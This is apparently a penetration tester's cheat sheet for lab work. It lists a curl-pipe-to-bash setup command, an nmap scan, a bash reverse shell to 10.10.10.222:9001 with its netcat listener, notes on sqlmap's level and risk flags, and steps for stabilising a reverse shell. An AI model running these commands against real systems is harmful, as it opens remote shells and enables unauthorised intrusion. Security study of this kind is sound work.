# Scripts

## 0 Geting start
``
curl -sL https://raw.githubusercontent.com/anthoai97/red-hand-on-scripts/main/tmux-setup.sh | bash
``

## Daily
```sh
#/bin/sh
nmap -Sc -sV -reason -oA nmap/makesense <>
bash -c 'bash -i >& /dev/tcp/10.10.10.222/9001 0>&1'
nc -lvnp 9001
find . -type f
ss -lntp
ps -ef --forest
```

## SQLMAP
--level (Scope of Testing: 1 to 5)
---
The --level flag dictates which entry points (injection points) sqlmap will test and how many payloads it throws at them. The default is 1.
Level	Injection Points & Payloads Tested
1 (Default)	Tests standard GET and POST parameters only.
2	Adds testing for HTTP Cookie headers.
3	Adds testing for HTTP User-Agent and Referer headers.
4	Expands payload lists for existing techniques (like boolean-based blind injections).
5	Adds testing for HTTP Host headers and runs the most exhaustive payload checks (can exceed 1,000+ requests per parameter).

--risk (Aggressiveness of Payloads: 1 to 3)
---

The --risk flag dictates how dangerous or disruptive the injected SQL payloads are to the target database. The default is 1.

Risk	Payload Behavior & Potential Impact
1 (Default)	Uses standard, non-intrusive queries designed to cause zero damage or disruption.
2	Adds heavy time-based blind payloads (e.g., SLEEP or WAITFOR). Can slow down or temporarily freeze a busy database.
3	Adds OR-based SQL injection payloads. Warning: If injected into an UPDATE or DELETE query (like a password reset or profile edit form), OR 1=1 can overwrite or wipe out the entire database table.

## PTY
```
Step 1 — Spawn a PTY:
python3 -c 'import pty; pty.spawn("/bin/bash")'

Step 2 — Press Ctrl+Z to background the shell.

Step 3 — In your local terminal:
stty raw -echo; fg

Step 4 — Back in the reverse shell:
export TERM=xterm
export SHELL=/bin/bash
```
